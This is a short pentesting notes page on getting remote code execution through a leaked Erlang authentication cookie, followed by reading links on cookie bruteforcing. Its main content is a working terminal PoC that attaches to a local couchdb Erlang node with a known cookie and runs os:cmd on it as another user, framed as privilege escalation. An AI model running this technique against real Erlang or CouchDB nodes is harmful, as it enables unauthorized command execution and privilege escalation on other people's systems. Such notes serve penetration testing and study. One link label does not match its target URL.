# Erlang

## Authentication Cookie RCE

If the authentication cookie for an Erlang node is leaked, then you can take advantage of this to achieve RCE.  Typically this will be via local port tcp/4369.  The following PoC connects to a local node with a cookie of cookieval, and then spawns a command on an adjacent node with the same cookie value.  If the adjacent node is run by `mainuser` then we achieve privilege escalation.

```
otheruser@booj:/$ export HOME=/tmp
export HOME=/tmp
otheruser@booj:/$ erl -sname booj -setcookie cookieval -remsh couchdb@localhost
<me booj -setcookie cookieval -remsh couchdb@localhost
Eshell V7.3 (abort with ^G)
(booj@booj)1> net_adm:ping(couchdb@localhost).
net_adm:ping(couchdb@localhost).
pong
(booj@booj)2> spawn(couchdb@localhost, fun() -> io:format("~p~n", [os:cmd('/usr/bin/id')]) end).
spawn(couchdb@localhost, fun() -> io:format("~p~n", [os:cmd('/usr/bin/id')]) end).
"uid=1000(mainuser) gid=1000(mainuser) groups=1000(mainuser)\n"
<6881.23434.8>
```

**Further Reading**

[https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/](https://legacy.gitbook.com/book/reboare/booj-security/edit#)

## Cookie Bruteforcing

**Further Reading**



[https://www.broot.ca/erlang-remsh-is-dangerous](https://www.broot.ca/erlang-remsh-is-dangerous)

[http://blog.listincomprehension.com/2010/03/spoofing-erlang-distribution-protocol.html](http://blog.listincomprehension.com/2010/03/spoofing-erlang-distribution-protocol.html)

[https://github.com/msantos/spoofed](https://github.com/msantos/spoofed)

[https://blog.voltone.net/post/4](https://blog.voltone.net/post/4)

[https://blog.voltone.net/post/12](https://blog.voltone.net/post/12)

[https://www.youtube.com/watch?v=42k70Y-yTYY](https://www.youtube.com/watch?v=42k70Y-yTYY)

[https://conference.hitb.org/hitbsecconf2017ams/materials/D2T4 - Don Bailey - Unauthorized Erlang.pdf](https://conference.hitb.org/hitbsecconf2017ams/materials/D2T4 - Don Bailey - Unauthorized Erlang.pdf)

